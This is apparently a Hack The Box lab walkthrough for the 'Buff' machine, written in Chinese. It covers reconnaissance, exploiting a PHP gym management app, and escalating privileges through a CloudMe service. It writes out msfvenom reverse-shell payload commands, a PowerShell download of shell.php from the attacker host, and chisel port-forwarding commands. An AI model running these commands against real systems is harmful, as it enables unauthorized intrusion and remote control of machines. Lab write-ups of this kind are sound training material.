# Buff
- URL : https://app.hackthebox.eu/machines/263
- IP : 10.129.2.18

## Recon
- 掃 Port
    -  ![](https://i.imgur.com/yL8iY6M.png)
- 掃目錄
    - ![](https://i.imgur.com/Y7oU0b5.png)
    - `/Readme.md`
        - ![](https://i.imgur.com/WmFd25G.png)
- 觀察首頁
    - ![](https://i.imgur.com/bzW40SX.png)
    - ![](https://i.imgur.com/SLSkSSK.png)
        - SQL 檔案
        - ![](https://i.imgur.com/9ocQOrC.png)
- 找到專案 Project
    - https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
    - ![](https://i.imgur.com/yUMlONu.png)
    - ![](https://i.imgur.com/LvcGkGa.png)
        - 預設密碼，登入失敗
- 試用 Exploit
    - ![](https://i.imgur.com/lpfFpjB.png)
- 準備另外一個 reverse shell
    - ![](https://i.imgur.com/ffRLY8D.png)
- 確認 Systeminfo
    - ![](https://i.imgur.com/Z9CEOFQ.png)
- 取 Userflag
    - ![](https://i.imgur.com/9AWNGuu.png)
    - ![](https://i.imgur.com/q33pwEX.png)

## 提權
- 確認 Defender 有開
    - ![](https://i.imgur.com/FFttCr6.png)
- 產 Shell
    - `msfvenom -p php/reverse_php LHOST=10.10.16.35 LPORT=7877 -f raw > shell.php`
    - `powershell -c "wget http://10.10.16.35/shell.php -outFile shell.php"`
- 亂逛系統
    - ![](https://i.imgur.com/fW23r7Q.png)
- 觀察開的 Port
    - `netstat -ano -p tcp`
    - ![](https://i.imgur.com/Cm2GtjU.png)

- 觀察執行中的 Process
    - `tasklist`
    - ![](https://i.imgur.com/FmIgOk3.png)
- 發現 Downloads 資料夾有 `CloudMe_1122.exe`
    - ![](https://i.imgur.com/IxszMnz.png)
    - ![](https://i.imgur.com/yZ8055X.png)
- 觀察開的 Port
    - ![](https://i.imgur.com/XuKH90a.png)
    - 8888 但他只綁 127.0.0.1
## Exploit
- 本地端執行
    - `./chisel server -p 9999 --reverse`
- 遠端執行
    - `chisel.exe client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
    - 把 Port 轉回 127.0.0.1:8888
- 收封包
    - ![](https://i.imgur.com/7j9ouzo.png)
- 使用 Exploit
    - https://www.exploit-db.com/exploits/48389
- 修改 shell code
    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python`
    - ![](https://i.imgur.com/42hWoXQ.png)
- 收 Reverse shell
    - ![](https://i.imgur.com/7FdFbwy.png)
- 取得 Root flag
    - ![](https://i.imgur.com/xJEo9ey.png)
